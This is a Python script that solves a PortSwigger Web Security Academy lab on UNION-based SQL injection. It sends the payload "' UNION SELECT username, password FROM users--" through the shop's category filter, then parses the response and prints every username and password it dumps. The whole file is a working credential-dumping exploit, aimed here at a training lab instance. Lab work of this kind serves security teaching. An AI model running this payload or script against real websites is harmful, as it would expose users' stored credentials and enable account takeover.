#!/usr/bin/env python3
"""
Solve the PortSwigger lab "SQL injection UNION attack, retrieving data from
other tables".

The product category filter (/filter?category=...) is injectable. The query
returns two text columns, so a UNION SELECT can append rows from the users
table, dumping every username and password into the response.

Lab: https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables
Usage: python3 solve.py https://YOUR-LAB-ID.web-security-academy.net
"""

import re
import sys
import argparse
import requests

# Verify TLS against the OS trust store (works on networks that inspect HTTPS).
import truststore
truststore.inject_into_ssl()

session = requests.Session()
LAB_URL = None  # set from the CLI arg in main()
REQUEST_TIMEOUT = 10

# Two text columns, so select username and password directly. The trailing
# -- comments out the rest of the original query.
PAYLOAD = "' UNION SELECT username, password FROM users--"


def fetch(path, method="GET", data=None, params=None, allow_redirects=True):
    """Send a request to the lab and return the response.

    `params` is a dict of query-string fields; requests URL-encodes the
    values, so a payload with spaces and quotes reaches the server intact.
    """
    url = LAB_URL.rstrip("/") + "/" + path.lstrip("/")
    return session.request(method, url, data=data, params=params,
                           timeout=REQUEST_TIMEOUT, allow_redirects=allow_redirects)


def report(name, found, detail=""):
    """Print a finding in a consistent [FOUND] / [clean] format."""
    tag = "FOUND" if found else "clean"
    print(f"[{tag}] {name}: {detail}")


def check_sql_injection():
    # Send the UNION payload through the injectable category parameter.
    resp = fetch("filter", params={"category": PAYLOAD})
    pairs = re.findall(r"<th>(\S+)</th>\s*<td>(\S+)</td>", resp.text)
    if not pairs:
        report("SQL injection", False, "no credentials returned")
        return

    for username, password in pairs:
        report("SQL injection", True, f"{username} : {password}")


def parse_args():
    parser = argparse.ArgumentParser(
        description="Dump credentials via a UNION-based SQL injection (PortSwigger lab)."
    )
    parser.add_argument(
        "url",
        help="Base URL of your lab instance, e.g. https://XXXX.web-security-academy.net",
    )
    return parser.parse_args()


def main():
    global LAB_URL
    args = parse_args()
    LAB_URL = args.url

    try:
        check_sql_injection()
    except requests.exceptions.RequestException as e:
        print(f"[!] Request failed: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()